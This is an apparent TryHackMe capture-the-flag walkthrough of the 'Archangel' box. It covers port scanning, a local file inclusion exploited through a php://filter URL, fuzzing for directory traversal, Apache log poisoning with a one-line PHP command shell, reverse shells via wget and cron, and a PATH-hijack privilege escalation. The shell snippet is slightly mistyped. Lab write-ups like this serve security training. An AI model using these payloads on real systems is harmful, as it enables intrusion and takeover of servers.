In this walkthrough, we'll go over a challenge (easy) level box called ***Archangel*** on [TryHackMe](https://tryhackme.com/room/archangel) 

![Archangel](archangel.png)

Let's start the scanning process with nmap. The IP address would be different when you deploy it:
```bash
nmap -sTV -n -sC -T4 -p- 10.10.7.126 --open
```
It looks like the ports 22 and 80 are open:
```bash
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-10 13:37 EDT
Nmap scan report for mafialive.thm (10.10.7.126)
Host is up (0.21s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9f:1d:2c:9d:6c:a4:0e:46:40:50:6f:ed:cf:1c:f3:8c (RSA)
|   256 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d (ECDSA)
|_  256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/test.php
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.72 seconds
```
When we visit the webpage, we can see that there is another domain:
![Archangel Index](aa-index-html.png)

Let's add that to the "/etc/hosts" file. Upon visiting the site, we can see the first flag. However, in this tutorial I'll be focusing on initial foothold and privilege escalation.

![Archangel New Domain](aa-new-domain.png)

We can run dirsearch on this new website `dirsearch -u http://mafialive.thm/ -r -f -t 50 -x 302,400,403,500,503 -w /usr/share/wordlists/dirb/big.txt`:
![Archangel Dirsearch](aa-new-domain-dirsearch.png)

We then check "robots.txt" and find another page "test.php" also dirsearch found that page:

![Archangel Test PHP](aa-new-domain-test-php.png)

After visiting http://mafialive.thm/test.php, we can see that the page is executing PHP:
![Archangel Test PHP exe](aa-test-php.png)
![Archangel Click](aa-click-button.png)

I use `php://filter/convert.base64-encode/resource=` function to obtain the content of test.php
`http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php`
![Archangel PHP Filter](aa-php-filter.png)

I then decode the encoded string and find the content of the test php file:
![Archangel Decode](aa-decode-test-php.png)

We would need to use "/var/www/html/development_testing" in the command so we can now pursue the LFI attack vector. We can fuzz the "test.php" for LFI with ffuf
`ffuf -w /usr/share/wfuzz/wordlist/vulns/dirTraversal-nix.txt -u http://mafialive.thm/test.php?view=/var/www/html/development_testing/FUZZ -fs 286,310 -t 100`:
![Archangel ffuf](aa-ffuf-LFI.png)

I try the first payload in BurpSuite to display the output:
![Archangel Passwd](aa-etc-passwd.png)

We can inspect "/var/log/apache2/access.log" file:
![Archangel Apache2](aa-apache2-log.png)

### Poisoning a file for RCE via LFI
We can now pursue an RCE via poisoning "/var/log/apache2/error.log":
```php
<?php passthrough($GET['cmd']); ?>
```
![Archangel Poison](aa-posioning.png)

After that we are able to run "ls -la" command:
![Archangel ls](aa-posioning-ls.png)
![Archangel nc](aa-posioning-nc.png)

I downloaded php-revershell from pentestmonkey and transferred it to the target machine with wget:
![Archangel Transfer PHP Shell](aa-transfer-php-shell.png)
![Archangel Wget](aa-wget.png)
![Archangel PHP Reverse Shell](aa-php-revshell.png)
![Archangel Initial Foothold](aa-initial-foothold.png)

### Lateral Movement
We can first look at "/etc/crontab" and it shows that there is a cronjob running by archangel:
![Archangel Crontab](aa-crontab.png)

Since we have rights to edit the file, we can run a python revshell:
![Archangel SH](aa-helloworld-sh.png)
![Archangel Lateral Movement](aa-lateral-movement.png)

We now have a shell as archangel:

![Archangel User](aa-archangel-user.png)

In the archangle's home folder there is an exe called backup so let's create a file and made it executable:
![Archangel CP](aa-create-cp.png)

We can now add "/home/archange/secret" to the PATH variable and run the backup binary file:
![Archangel Root](aa-root-txt.png)

I hope you enjoyed this walkthrough.

[<= Go Back to TryHackMe Walkthroughs](TryHackMeWalkthroughs.md)

[<= Go Back to Main Menu](index.md)
